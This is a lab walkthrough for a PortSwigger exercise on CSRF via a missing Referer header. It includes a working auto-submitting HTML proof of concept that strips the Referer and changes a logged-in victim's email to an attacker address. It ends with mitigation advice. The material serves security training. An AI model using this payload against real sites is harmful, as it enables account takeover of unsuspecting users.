# PortSwigger Lab: CSRF where Referer Validation Depends on Header Being Present

## Overview
This lab focuses on a Cross-Site Request Forgery (CSRF) vulnerability in an application that attempts to block cross-domain requests using the `Referer` HTTP header but has an insecure fallback. The goal is to exploit this vulnerability to change the email address of a logged-in user.

## Objective
Use the exploit server to host an HTML page that performs a CSRF attack to change the viewer's email address.

## Credentials
- **Username**: wiener
- **Password**: peter

## Steps to Solve the Lab

### Step 1: Log in and Capture a Legitimate Request
1. Open Burp's browser and navigate to the lab URL.
2. Log in using the provided credentials.
3. Go to the “Change email” page and submit the form with a new, unique email address (not already taken).
4. Capture the resulting request in Burp's Proxy History.

### Step 2: Verify the Referer Check
1. Send the captured request to Burp Repeater.
2. Modify the `Referer` header:
   - Change the domain to a different one (e.g., `https://evil.com`) - **Request will be rejected.**
   - Delete the `Referer` header entirely - **Request will be accepted.**

### Step 3: Craft the CSRF Proof of Concept (PoC) HTML
Create a simple HTML page to exploit the vulnerability:

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="referrer" content="no-referrer"> # This ensures the referre header isnt sent 
  <title>CSRF PoC</title>
</head>
<body>
  <form action="https://vulnerable-lab.com/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
  </form>
  <script>
    document.forms[0].submit();
  </script>
</body>
</html>

```
## Summary of Vulnerability
- Type: CSRF
- Vulnerability Mechanism: The application only rejects requests with a Referer from a  different origin; requests without a Referer are accepted, allowing for CSRF attacks.
- Mitigation Strategy in Practice: Relying solely on Referer checks is insecure; robust CSRF defenses should incorporate CSRF tokens, SameSite cookie attributes, and Origin header validation.

### Learnings
- Understanding how CSRF attacks can circumvent weak Referer validation mechanisms.
- The importance of robust CSRF mitigation techniques.
- Practical experience in crafting a PoC for a CSRF vulnerability.